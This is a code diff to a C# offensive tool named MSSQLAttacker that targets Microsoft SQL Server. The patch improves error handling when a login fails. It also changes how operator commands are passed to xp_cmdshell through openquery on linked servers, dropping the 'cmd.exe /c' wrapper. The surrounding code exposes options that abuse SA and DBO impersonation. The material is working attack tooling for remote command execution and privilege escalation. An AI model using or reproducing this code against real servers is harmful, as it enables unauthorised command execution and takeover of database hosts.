@@ -70,7 +70,7 @@ namespace MSSQLAttacker
             catch
             {
                 doWrite(0, "Auth failed");
-                Environment.Exit(0);
+                return null;
             }
             return con;
 
@@ -358,8 +358,8 @@ namespace MSSQLAttacker
                     String input = Console.ReadLine();
                     if (input == "exit") { break; }
                     if (string.IsNullOrEmpty(input)) { continue; }
-                    String cmd = "cmd.exe /c " + input;
-                    String cmdString = "select * from openquery(\"" + linkedServer + "\", 'select @@servername; exec xp_cmdshell ''" + cmd + "''')";
+                    //String cmd = "cmd.exe /c " + input; #BugFix
+                    String cmdString = "select * from openquery(\"" + linkedServer + "\", 'select @@servername; exec xp_cmdshell ''" + input + "''')";
                     String temp = getFilteredResult(getQueryResult(con, cmdString));
                     doWrite(2, "Command Executed");
                     return;
@@ -369,8 +369,8 @@ namespace MSSQLAttacker
             }
             try
             {
-                String basecmd = "cmd.exe /c " + command;
-                String query = "select * from openquery(\"" + linkedServer + "\", 'select @@servername; exec xp_cmdshell ''" + basecmd + "''')";
+                //String basecmd = "cmd.exe /c " + command; #BugFix
+                String query = "select * from openquery(\"" + linkedServer + "\", 'select @@servername; exec xp_cmdshell ''" + command + "''')";
                 String temp1 = getFilteredResult(getQueryResult(con, query));
                 doWrite(2, "Command Executed");
             }
@@ -419,7 +419,7 @@ namespace MSSQLAttacker
                     con = connectDb(args[1]);
                     break;
             }
-
+            if (con == null) { return; }
             while (!exit)
             {
 
@@ -588,6 +588,7 @@ namespace MSSQLAttacker
                 else { con = connectDb(dbserver); }
                  }
             catch (Exception) { return; }
+            if (con == null) { return; }
             //Impersonation
             if (Array.Exists(args, element => element == "-impersonateSA")) { abuseImpersonation(con); }
             if (Array.Exists(args, element => element == "-impersonateDBO")){ if (checkArgs(args, "-dbo")) { abuseImpersonationDBO(con, dboname); } else { abuseImpersonationDBO(con); } }
